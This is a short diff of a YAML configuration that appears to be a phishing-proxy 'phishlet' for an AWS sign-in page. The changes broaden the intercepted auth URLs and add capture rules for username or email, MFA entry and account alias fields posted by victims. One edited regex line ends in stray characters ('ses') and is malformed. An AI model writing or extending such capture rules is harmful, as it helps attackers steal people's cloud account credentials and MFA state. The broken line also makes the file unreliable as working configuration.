@@ -115,10 +115,13 @@ auth_urls:
   - '/authenticate/.*'
   - '/p/auth'
   - '/p/auth/.*'
+  - '/p/auth.*'
+  - '/p/auth '
+  - '/console/js/healthcheck.js'
 
 credentials:
   username:
-    key: 'username'
+    key: 'username|email'
     search: '(.*)'
     type: 'post'
   password:
@@ -144,8 +147,11 @@ credentials:
   - key: 'aws-mfa-entered'
     search: '(.*)'
     type: 'post'
+  - key: 'aws-account-alias'
+    search: '(.*)'
+    type: 'post'
   - key: ''
-    search: '([^"]*)'
+    search: '([^"]*)'ses
     type: 'json'
 
 login :
